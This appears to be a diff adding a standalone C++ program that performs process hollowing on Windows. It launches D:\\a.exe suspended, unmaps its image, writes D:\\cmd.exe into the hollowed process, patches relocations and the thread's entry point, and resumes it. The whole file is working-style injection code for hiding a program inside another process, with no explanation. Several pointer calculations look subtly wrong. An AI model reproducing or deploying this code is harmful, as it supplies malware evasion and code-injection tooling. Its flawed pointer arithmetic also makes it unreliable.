@@ -1,0 +1,139 @@
+
+#include<Windows.h>
+#include<winternl.h>
+#include<stdio.h>
+using NtUnmapViewofSection = NTSTATUS(WINAPI*)(
+	HANDLE,
+	PVOID
+	);
+/*using NtQueryInformationProcessS = NTSTATUS(NTAPI*)(
+	HANDLE ProcessHandle,
+	PROCESSINFOCLASS ProcessInformationClass,
+	PVOID ProcessInformation,
+	ULONG ProcessInformationLength,
+	PULONG ReturnLength
+	);*/
+typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
+	IN  HANDLE ProcessHandle,
+	IN  PROCESSINFOCLASS ProcessInformationClass,
+	OUT PVOID ProcessInformation,
+	IN  ULONG ProcessInformationLength,
+	OUT PULONG ReturnLength    OPTIONAL
+	);
+pfnNtQueryInformationProcess gNtQueryInformationProcess;
+typedef struct BASE_RELOCATION_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+}BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+}BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+
+int main()
+{
+	LPSTARTUPINFOA si = new STARTUPINFOA();
+	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
+	DWORD returnLength = 0;
+	CreateProcessA(NULL,(LPSTR)"D:\\a.exe",NULL,NULL,TRUE,CREATE_SUSPENDED,NULL,NULL,si,pi);
+	HANDLE destProcess = pi->hProcess;
+
+	HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
+	gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll,"NtQueryInformationProcess");
+	
+	gNtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
+
+
+/*	NtQueryInformationProcessS myntqueryprocess = (NtQueryInformationProcessS)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess"));
+	myntqueryprocess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);*/
+
+
+	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;
+
+
+	LPVOID destImageBase = 0;
+	SIZE_T bytesRead = NULL;
+	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);
+	
+	
+	/*
+	CONTEXT ctx;
+	ctx.ContextFlags = CONTEXT_FULL;
+	GetThreadContext(destProcess,&ctx);
+	DWORD rdx = ctx.Rdx;
+	DWORD pebImageBaseOffset = rdx + 16;
+	*/
+	
+
+
+
+	NtUnmapViewofSection myntunmapviewofsection = (NtUnmapViewofSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
+	myntunmapviewofsection(destProcess,destImageBase);
+
+
+	HANDLE sourceFile = CreateFileA("D:\\cmd.exe",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,NULL,NULL);
+	DWORD sourceFileSize = GetFileSize(sourceFile,NULL);
+	LPDWORD filebytesread = 0;
+	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(),0,sourceFileSize);
+	ReadFile(sourceFile,sourceFileBytesBuffer,sourceFileSize,NULL,NULL);
+	PIMAGE_DOS_HEADER source_dosheader = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
+	PIMAGE_NT_HEADERS source_ntheader = (PIMAGE_NT_HEADERS)sourceFileBytesBuffer + source_dosheader->e_lfanew;
+	SIZE_T sourceSize = source_ntheader->OptionalHeader.SizeOfImage;
+
+	LPVOID newDestImageBase = VirtualAllocEx(destProcess,destImageBase,sourceSize,MEM_COMMIT| MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+	destImageBase = newDestImageBase;
+	DWORD delta_of_bases = (DWORD)destImageBase - source_ntheader->OptionalHeader.ImageBase;
+	
+	source_ntheader->OptionalHeader.ImageBase = (DWORD)destImageBase;
+	WriteProcessMemory(destProcess,newDestImageBase,sourceFileBytesBuffer,source_ntheader->OptionalHeader.SizeOfHeaders,NULL);
+	
+	
+	PIMAGE_SECTION_HEADER sourceSection = (PIMAGE_SECTION_HEADER)((DWORD)source_dosheader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
+	PIMAGE_SECTION_HEADER sourceoldsection = sourceSection;
+	for (int i = 0; i < source_ntheader->FileHeader.NumberOfSections;i++) {
+		PVOID sourcesectionlocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceSection->PointerToRawData);
+		PVOID destinationsectionlocation = (PVOID)((DWORD)destImageBase + sourceSection->VirtualAddress);
+		WriteProcessMemory(destProcess,destinationsectionlocation,sourcesectionlocation,sourceSection->SizeOfRawData,NULL);
+		sourceSection++;
+	}
+
+
+	IMAGE_DATA_DIRECTORY relocationTable = source_ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+	sourceSection = sourceoldsection;
+	for (int i = 0; i < source_ntheader->FileHeader.NumberOfSections; i++) {
+		BYTE* relocSectionsName = (BYTE*)".reloc";
+		if (memcmp(sourceSection->Name, relocSectionsName, 5) != 0) {
+			sourceSection++;
+			continue;
+		}
+		DWORD sourceRelocationTableRaw = sourceSection->PointerToRawData;
+		DWORD relocationoffset = 0;
+		while (relocationoffset < relocationTable.Size) {
+			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationoffset);
+			relocationoffset += sizeof(BASE_RELOCATION_BLOCK);
+			DWORD relocationentrycount = (relocationBlock->BlockSize-sizeof(BASE_RELOCATION_BLOCK))/sizeof(BASE_RELOCATION_ENTRY);
+			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((PDWORD)sourceFileBytesBuffer+sourceRelocationTableRaw+relocationoffset);
+			for (DWORD y = 0; y < relocationentrycount; y++) {
+				relocationoffset += sizeof(BASE_RELOCATION_ENTRY);
+				if (relocationEntries[y].Type == 0) {
+					continue;
+				}
+				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
+				DWORD patchedbuffer = 0;
+				ReadProcessMemory(destProcess,(LPCVOID)((DWORD)destImageBase+patchAddress),&patchedbuffer,sizeof(DWORD),&bytesRead);
+				patchedbuffer += delta_of_bases;
+				WriteProcessMemory(destProcess,(PVOID)((DWORD) destImageBase+patchAddress),&patchedbuffer,sizeof(DWORD),(SIZE_T*)filebytesread);
+				int a = GetLastError();
+			}
+		}
+	}
+	LPCONTEXT context = new CONTEXT();
+	context->ContextFlags = CONTEXT_INTEGER;
+	GetThreadContext(pi->hThread,context);
+	DWORD patchedentrypoint = (DWORD)destImageBase + source_ntheader->OptionalHeader.AddressOfEntryPoint;
+	context->Eax = patchedentrypoint;
+	SetThreadContext(pi->hThread,context);
+	ResumeThread(pi->hThread);
+	return 0;
+}
